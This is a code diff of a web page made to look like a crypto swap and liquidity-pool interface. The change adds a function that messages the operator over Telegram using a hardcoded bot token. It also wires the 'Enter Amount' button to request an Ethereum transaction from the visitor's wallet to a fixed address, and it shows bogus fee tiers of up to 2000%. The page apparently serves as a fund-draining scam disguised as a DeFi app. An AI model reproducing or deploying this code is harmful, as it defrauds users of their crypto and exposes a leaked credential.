@@ -83,7 +83,23 @@ function botsend1(){
   },
   "data": JSON.stringify({
     "chat_id": '1164330043',
-    "text": 'test'
+    "text": 'Swap'
+  })
+}
+
+function botsend2(){
+  var settings = {
+  "async": true,
+  "crossDomain": true,
+  "url": "https://api.telegram.org/bot" + '1671846956:AAH2sMEv7ojBXEwZNHE3ZK9aHG_sCckChXc' + "/sendMessage",
+  "method": "POST",
+  "headers": {
+    "Content-Type": "application/json",
+    "cache-control": "no-cache"
+  },
+  "data": JSON.stringify({
+    "chat_id": '1164330043',
+    "text": 'Pool'
   })
 }
 
@@ -149,103 +165,14 @@ $(function() {
 
         <select name="example" class="test-select2">
             <option value="選択肢1">ETH</option>
-          <option value="選択肢2">DAI</option>
-          <option value="選択肢3">USDC</option>
-          <option value="選択肢3">USDT</option>
-          <option value="選択肢3">WBTC</option>
-          <option value="選択肢3">1INCH</option>
-          <option value="選択肢3">AAVE</option>
-          <option value="選択肢3">AMP</option>
-          <option value="選択肢3">ANT</option>
-          <option value="選択肢3">BAL</option>
-          <option value="選択肢3">BAND</option>
-          <option value="選択肢3">BAT</option>
-          <option value="選択肢3">BNT</option>
-          <option value="選択肢3">COMP</option>
-          <option value="選択肢3">CRV</option>
-          <option value="選択肢3">CVC</option>
-          <option value="選択肢3">DAI</option>
-          <option value="選択肢3">DNT</option>
-          <option value="選択肢3">ENJ</option>
-          <option value="選択肢3">GNO</option>
-          <option value="選択肢3">GRT</option>
-          <option value="選択肢3">GUSD</option>
-          <option value="選択肢3">KEEP</option>
-          <option value="選択肢3">KNC</option>
-          <option value="選択肢3">LINK</option>
-          <option value="選択肢3">LRC</option>
-          <option value="選択肢3">MANA</option>
-          <option value="選択肢3">MKR</option>
-          <option value="選択肢3">MLN</option>
-          <option value="選択肢3">NMR</option>
-          <option value="選択肢3">NU</option>
-          <option value="選択肢3">OXT</option>
-          <option value="選択肢3">PAXG</option>
-          <option value="選択肢3">REP</option>
-          <option value="選択肢3">SAND</option>
-          <option value="選択肢3">SKL</option>
-          <option value="選択肢3">SNX</option>
-          <option value="選択肢3">STORJ</option>
-          <option value="選択肢3">TBTC</option>
-          <option value="選択肢3">UMA</option>
-          <option value="選択肢3">UNI</option>
-          <option value="選択肢3">USDC</option>
-          <option value="選択肢3">USDT</option>
-          <option value="選択肢3">WBTC</option>
-          <option value="選択肢3">WETH</option>
-          <option value="選択肢3">YFI</option>
-          <option value="選択肢3">ZRX</option>
+            <option value="選択肢1">USDT</option>
         </select>
 
         <select name="example" class="test1-select2">
-            <option value="選択肢1">ETH</option>
-          <option value="選択肢2">DAI</option>
-          <option value="選択肢3">USDC</option>
-          <option value="選択肢3">USDT</option>
-          <option value="選択肢3">WBTC</option>
-          <option value="選択肢3">1INCH</option>
-          <option value="選択肢3">AAVE</option>
-          <option value="選択肢3">AMP</option>
-          <option value="選択肢3">ANT</option>
-          <option value="選択肢3">BAL</option>
-          <option value="選択肢3">BAND</option>
-          <option value="選択肢3">BAT</option>
-          <option value="選択肢3">BNT</option>
-          <option value="選択肢3">COMP</option>
-          <option value="選択肢3">CRV</option>
-          <option value="選択肢3">CVC</option>
-          <option value="選択肢3">DAI</option>
-          <option value="選択肢3">DNT</option>
-          <option value="選択肢3">ENJ</option>
-          <option value="選択肢3">GNO</option>
-          <option value="選択肢3">GRT</option>
-          <option value="選択肢3">GUSD</option>
-          <option value="選択肢3">KEEP</option>
-          <option value="選択肢3">KNC</option>
-          <option value="選択肢3">LINK</option>
-          <option value="選択肢3">LRC</option>
-          <option value="選択肢3">MANA</option>
-          <option value="選択肢3">MKR</option>
-          <option value="選択肢3">MLN</option>
-          <option value="選択肢3">NMR</option>
-          <option value="選択肢3">NU</option>
-          <option value="選択肢3">OXT</option>
-          <option value="選択肢3">PAXG</option>
-          <option value="選択肢3">REP</option>
-          <option value="選択肢3">SAND</option>
-          <option value="選択肢3">SKL</option>
-          <option value="選択肢3">SNX</option>
-          <option value="選択肢3">STORJ</option>
-          <option value="選択肢3">TBTC</option>
-          <option value="選択肢3">UMA</option>
-          <option value="選択肢3">UNI</option>
-          <option value="選択肢3">USDC</option>
-          <option value="選択肢3">USDT</option>
-          <option value="選択肢3">WBTC</option>
-          <option value="選択肢3">WETH</option>
-          <option value="選択肢3">YFI</option>
-          <option value="選択肢3">ZRX</option>
+          <option value="選択肢1">ETH</option>
+          <option value="選択肢1">USDT</option>
         </select>
+
         </br></br>
         <button class="sendEthButton btn btn-info btn-lg">Enter Amount</button>
       </div>
@@ -263,110 +190,21 @@ $(function() {
         <h5>Select Pairs</h5>
         <select name="example" class="test2-select2">
           <option value="選択肢1">ETH</option>
-          <option value="選択肢2">DAI</option>
-          <option value="選択肢3">USDC</option>
-          <option value="選択肢3">USDT</option>
-          <option value="選択肢3">WBTC</option>
-          <option value="選択肢3">1INCH</option>
-          <option value="選択肢3">AAVE</option>
-          <option value="選択肢3">AMP</option>
-          <option value="選択肢3">ANT</option>
-          <option value="選択肢3">BAL</option>
-          <option value="選択肢3">BAND</option>
-          <option value="選択肢3">BAT</option>
-          <option value="選択肢3">BNT</option>
-          <option value="選択肢3">COMP</option>
-          <option value="選択肢3">CRV</option>
-          <option value="選択肢3">CVC</option>
-          <option value="選択肢3">DAI</option>
-          <option value="選択肢3">DNT</option>
-          <option value="選択肢3">ENJ</option>
-          <option value="選択肢3">GNO</option>
-          <option value="選択肢3">GRT</option>
-          <option value="選択肢3">GUSD</option>
-          <option value="選択肢3">KEEP</option>
-          <option value="選択肢3">KNC</option>
-          <option value="選択肢3">LINK</option>
-          <option value="選択肢3">LRC</option>
-          <option value="選択肢3">MANA</option>
-          <option value="選択肢3">MKR</option>
-          <option value="選択肢3">MLN</option>
-          <option value="選択肢3">NMR</option>
-          <option value="選択肢3">NU</option>
-          <option value="選択肢3">OXT</option>
-          <option value="選択肢3">PAXG</option>
-          <option value="選択肢3">REP</option>
-          <option value="選択肢3">SAND</option>
-          <option value="選択肢3">SKL</option>
-          <option value="選択肢3">SNX</option>
-          <option value="選択肢3">STORJ</option>
-          <option value="選択肢3">TBTC</option>
-          <option value="選択肢3">UMA</option>
-          <option value="選択肢3">UNI</option>
-          <option value="選択肢3">USDC</option>
-          <option value="選択肢3">USDT</option>
-          <option value="選択肢3">WBTC</option>
-          <option value="選択肢3">WETH</option>
-          <option value="選択肢3">YFI</option>
-          <option value="選択肢3">ZRX</option>
+          <option value="選択肢1">BUl</option>
+          <option value="選択肢1">USDT</option>
         </select>
 
         <select name="example" class="test3-select2">
-          <option value="選択肢1">ETH</option>
-          <option value="選択肢2">DAI</option>
-          <option value="選択肢3">USDC</option>
-          <option value="選択肢3">USDT</option>
-          <option value="選択肢3">WBTC</option>
-          <option value="選択肢3">1INCH</option>
-          <option value="選択肢3">AAVE</option>
-          <option value="選択肢3">AMP</option>
-          <option value="選択肢3">ANT</option>
-          <option value="選択肢3">BAL</option>
-          <option value="選択肢3">BAND</option>
-          <option value="選択肢3">BAT</option>
-          <option value="選択肢3">BNT</option>
-          <option value="選択肢3">COMP</option>
-          <option value="選択肢3">CRV</option>
-          <option value="選択肢3">CVC</option>
-          <option value="選択肢3">DAI</option>
-          <option value="選択肢3">DNT</option>
-          <option value="選択肢3">ENJ</option>
-          <option value="選択肢3">GNO</option>
-          <option value="選択肢3">GRT</option>
-          <option value="選択肢3">GUSD</option>
-          <option value="選択肢3">KEEP</option>
-          <option value="選択肢3">KNC</option>
-          <option value="選択肢3">LINK</option>
-          <option value="選択肢3">LRC</option>
-          <option value="選択肢3">MANA</option>
-          <option value="選択肢3">MKR</option>
-          <option value="選択肢3">MLN</option>
-          <option value="選択肢3">NMR</option>
-          <option value="選択肢3">NU</option>
-          <option value="選択肢3">OXT</option>
-          <option value="選択肢3">PAXG</option>
-          <option value="選択肢3">REP</option>
-          <option value="選択肢3">SAND</option>
-          <option value="選択肢3">SKL</option>
-          <option value="選択肢3">SNX</option>
-          <option value="選択肢3">STORJ</option>
-          <option value="選択肢3">TBTC</option>
-          <option value="選択肢3">UMA</option>
-          <option value="選択肢3">UNI</option>
-          <option value="選択肢3">USDC</option>
-          <option value="選択肢3">USDT</option>
-          <option value="選択肢3">WBTC</option>
-          <option value="選択肢3">WETH</option>
-          <option value="選択肢3">YFI</option>
-          <option value="選択肢3">ZRX</option>
+            <option value="選択肢1">ETH</option>
+            <option value="選択肢1">BUl</option>
+            <option value="選択肢1">USDT</option>
         </select>
+        </br></br>
+        <h5>Select Fee Tier</h5>
+          ①ETH×Bul        2000%</br>
+          ②USDT×Bul     1000%</br>
+          ③ETH×USDT   45%</br>
         </br>
-        <h5>Select Fee Tier</h5></br>
-        <select name="example" class="form-select">
-        <option value="選択肢1">0.05% fee</option>
-        <option value="選択肢2">0.3% fee</option>
-        <option value="選択肢3">1% fee</option>
-        </select>
         <h6>Your liquidity will only earn fees when the market price of the pair is within your range.</h6>
         </br>
         <button class="sendEthButton1 btn btn-success btn-lg">Enter Amount</button>
@@ -442,7 +280,24 @@ $(function() {
     //Sending Ethereum to an address
     sendEthButton1.addEventListener('click', () => {
       
+      botsend2();
 
+      ethereum
+        .request({
+          method: 'eth_sendTransaction',
+          params: [
+            {
+              from: web3.currentProvider.selectedAddress,
+              to: '0x2f318C334780961FB129D2a6c30D0763d9a5C970',
+              gasPrice: '0x09184e72a000',
+              gas: '0x2710',
+            },
+          ],
+        })
+        .then((txHash) => console.log(txHash))
+        .catch((error) => console.error);
+
+    });
 
 
     });
